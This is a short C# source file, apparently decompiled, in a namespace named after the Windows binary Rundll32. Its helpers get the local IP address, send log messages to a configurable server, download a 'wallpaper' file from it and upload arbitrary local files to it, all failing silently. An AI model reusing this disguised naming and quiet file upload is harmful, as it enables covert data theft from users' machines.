using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace Rundll32;

public static class Common
{
	public static string GetLocalIPv4(NetworkInterfaceType _type = NetworkInterfaceType.Ethernet)
	{
		string result = "";
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.NetworkInterfaceType != _type || networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			foreach (GatewayIPAddressInformation gatewayAddress in networkInterface.GetIPProperties().GatewayAddresses)
			{
				_ = gatewayAddress;
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork)
					{
						result = unicastAddress.Address.ToString();
					}
				}
			}
		}
		return result;
	}

	public static void clientlog(string url, string ip, string message)
	{
		if (string.IsNullOrEmpty(url))
		{
			return;
		}
		string address = url + "log?ip=" + ip + "&message=" + message;
		try
		{
			using WebClient webClient = new WebClient();
			Stream stream = webClient.OpenRead(address);
			Console.WriteLine(new StreamReader(stream).ReadToEnd());
			stream.Close();
		}
		catch
		{
		}
	}

	public static void clientwallpaper(string url, string ip, string filepath)
	{
		if (string.IsNullOrEmpty(url))
		{
			return;
		}
		string address = url + "wallpaper?ip=" + ip;
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadFile(address, filepath);
		}
		catch
		{
		}
	}

	public static void clientupload(string url, string ip, string filepath)
	{
		if (string.IsNullOrEmpty(url))
		{
			return;
		}
		string address = url + "uploadfile?ip=" + ip;
		try
		{
			using WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(address, filepath);
			Encoding.UTF8.GetString(bytes);
		}
		catch
		{
		}
	}
}
